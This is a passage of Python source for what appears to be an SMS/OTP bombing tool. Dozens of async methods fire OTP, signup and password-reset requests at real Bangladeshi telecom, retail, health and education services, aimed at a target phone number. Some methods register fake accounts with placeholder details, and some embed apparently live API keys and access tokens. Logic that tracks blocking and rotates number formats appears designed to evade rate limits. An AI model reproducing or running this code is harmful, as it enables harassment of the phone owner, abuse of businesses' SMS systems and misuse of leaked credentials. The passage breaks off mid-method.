        url = f"https://api.hishabexpress.com/login/status".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API25 - Hishab Express Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API25 - Hishab Express Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api26___chorcha_auth_check(self):
        api_name = "Api26 - Chorcha Auth Check"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mujib.chorcha.net/auth/check?phone={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API26 - Chorcha Auth Check", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API26 - Chorcha Auth Check", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api27___wafilife_otp(self):
        api_name = "Api27 - Wafilife Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={target}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API27 - Wafilife OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API27 - Wafilife OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api28___robi_account_otp(self):
        api_name = "Api28 - Robi Account Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://webapi.robi.com.bd/v1/account/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API28 - Robi Account OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API28 - Robi Account OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api29___chardike_otp(self):
        api_name = "Api29 - Chardike Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.chardike.com/api/chardike-login-need".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API29 - Chardike OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API29 - Chardike OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api30___e_testpaper_otp(self):
        api_name = "Api30 - E Testpaper Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://dev.etestpaper.net/api/v4/auth/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API30 - E-TestPaper OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API30 - E-TestPaper OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api31___gpay_signup(self):
        api_name = "Api31 - Gpay Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API31 - GPay Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API31 - GPay Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api32___applink_otp(self):
        target = '88' + self.target
        url = f"https://apps.applink.com.bd/appstore-v4-server/login/otp/request".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API32 - Applink OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API32 - Applink OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api33___priyoshikkhaloy(self):
        api_name = "Api33 - Priyoshikkhaloy"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://app.priyoshikkhaloy.com/api/user/register-login.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API33 - Priyoshikkhaloy", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API33 - Priyoshikkhaloy", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api34___kabbik_otp(self):
        target = '88' + self.target
        url = f"https://api.kabbik.com/v1/auth/otpnew".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"qOQNBtVmoTTPVmfn"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API34 - Kabbik OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API34 - Kabbik OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api35___salextra(self):
        api_name = "Api35 - Salextra"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://salextra.com.bd/customer/checkusernameavailabilityonregistration".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API35 - Salextra", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API35 - Salextra", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api36___sundora(self):
        api_name = "Api36 - Sundora"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://api.sundora.com.bd/api/user/customer/".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","draft_order_id":null,"first_name":"User","last_name":"Test","note":{"birthday":","gender":"male"},"withTimeout":true,"newsletter_email":true,"newsletter_sms":true}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API36 - Sundora", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API36 - Sundora", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api37___mygp_cinematic(self):
        api_name = "Api37 - Mygp Cinematic"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{target}/SBENT_3GB7D"
        try:
            async with self.session.post(url, json=json.loads('{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API37 - MyGP Cinematic", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API37 - MyGP Cinematic", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api38___bajistar(self):
        api_name = "Api38 - Bajistar"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{target}"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API38 - Bajistar", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API38 - Bajistar", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api39___doctime(self):
        api_name = "Api39 - Doctime"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.doctime.com.bd/api/authenticate".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API39 - Doctime", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API39 - Doctime", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api40___grameenphone_fi(self):
        api_name = "Api40 - Grameenphone Fi"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://webloginda.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API40 - Grameenphone FI", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API40 - Grameenphone FI", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api41___meenabazar(self):
        api_name = "Api41 - Meenabazar"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={target}&type=login"
        try:
            async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API41 - Meenabazar", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API41 - Meenabazar", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api42___medeasy(self):
        target = '+88' + self.target
        url = f"https://api.medeasy.health/api/send-otp/+88{target}/"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API42 - Medeasy", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API42 - Medeasy", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api43___iqra_live(self):
        api_name = "Api43 - Iqra Live"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{target}"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API43 - Iqra Live", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API43 - Iqra Live", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api44___chokrojan(self):
        api_name = "Api44 - Chokrojan"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://chokrojan.com/api/v1/passenger/login/mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API44 - Chokrojan", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API44 - Chokrojan", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api45___shomvob(self):
        api_name = "Api45 - Shomvob"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API45 - Shomvob", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API45 - Shomvob", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api46___redx_signup_2(self):
        api_name = "Api46 - Redx Signup 2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.redx.com.bd/v1/user/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API46 - RedX Signup 2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API46 - RedX Signup 2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api47___mygp_send_otp(self):
        api_name = "Api47 - Mygp Send Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
        try:
            async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API47 - MyGP Send OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API47 - MyGP Send OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api48___bdjobs(self):
        api_name = "Api48 - Bdjobs"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"firstName":"User","lastName":","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API48 - BDJobs", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API48 - BDJobs", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api49___ultimate_organic_register(self):
        api_name = "Api49 - Ultimate Organic Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://ultimateasiteapi.com/api/register-customer".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API49 - Ultimate Organic Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API49 - Ultimate Organic Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api50___ultimate_organic_forget(self):
        api_name = "Api50 - Ultimate Organic Forget"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://ultimateasiteapi.com/api/forget-customer-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API50 - Ultimate Organic Forget", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API50 - Ultimate Organic Forget", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api51___foodaholic(self):
        target = '+88' + self.target
        url = f"https://foodaholic.com.bd/api/v1/auth/login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API51 - Foodaholic", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API51 - Foodaholic", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api52___kfc_bd(self):
        api_name = "Api52 - Kfc Bd"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.kfcbd.com/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"User","email":"user{phone}@gmail.com","mobile":"{phone}","device_token":"test","otp":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API52 - KFC BD", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API52 - KFC BD", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api53___gp_offer_otp(self):
        api_name = "Api53 - Gp Offer Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API53 - GP Offer OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API53 - GP Offer OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api54___eonbazar_register(self):
        api_name = "Api54 - Eonbazar Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://app.eonbazar.com/api/auth/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobile":"{phone}","name":"User Test","password":"Password123","email":"user{phone}@gmail.com"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API54 - Eonbazar Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API54 - Eonbazar Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api55___eat_z(self):
        api_name = "Api55 - Eat Z"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://api.eat-z.com/auth/customer/app-connect".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API55 - Eat-Z", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API55 - Eat-Z", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api56___osudpotro(self):
        api_name = "Api56 - Osudpotro"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.osudpotro.com/api/v1/users/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API56 - Osudpotro", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API56 - Osudpotro", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api57___kormi24(self):
        api_name = "Api57 - Kormi24"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.kormi24.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API57 - Kormi24", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API57 - Kormi24", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api58___weblogin_gp(self):
        api_name = "Api58 - Weblogin Gp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://weblogin.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API58 - Weblogin GP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API58 - Weblogin GP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api59___shwapno(self):
        target = '+88' + self.target
        url = f"https://www.shwapno.com/api/auth".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API59 - Shwapno", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API59 - Shwapno", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api60___quizgiri(self):
        api_name = "Api60 - Quizgiri"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://developer.quizgiri.xyz:443/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API60 - Quizgiri", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API60 - Quizgiri", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api61___banglalink_mybl(self):
        api_name = "Api61 - Banglalink Mybl"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://myblapi.banglalink.net/api/v1/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API61 - Banglalink MyBL", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API61 - Banglalink MyBL", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api62___walton_plaza(self):
        api_name = "Api62 - Walton Plaza"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.waltonplaza.com.bd/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"test-device","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API62 - Walton Plaza", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API62 - Walton Plaza", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api63___pbs(self):
        api_name = "Api63 - Pbs"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://apialpha.pbs.com.bd/api/OTP/generateOTP".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API63 - PBS", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API63 - PBS", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api64___aarong(self):
        api_name = "Api64 - Aarong"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mcprod.aarong.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }","variables":{"email":","password":","type":"mobile_number","mobile_number":"{phone}"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API64 - Aarong", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API64 - Aarong", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api65___arogga_app(self):
        api_name = "Api65 - Arogga App"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API65 - Arogga App", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API65 - Arogga App", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api66___sundarban_courier(self):
        api_name = "Api66 - Sundarban Courier"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api-gateway.sundarbancourierltd.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API66 - Sundarban Courier", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API66 - Sundarban Courier", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api67___quiztime(self):
        api_name = "Api67 - Quiztime"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API67 - QuizTime", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API67 - QuizTime", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api68___dressup(self):
        api_name = "Api68 - Dressup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API68 - DressUp", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API68 - DressUp", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api69___ghoori_learning(self):
        api_name = "Api69 - Ghoori Learning"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API69 - Ghoori Learning", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API69 - Ghoori Learning", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api70___garibook(self):
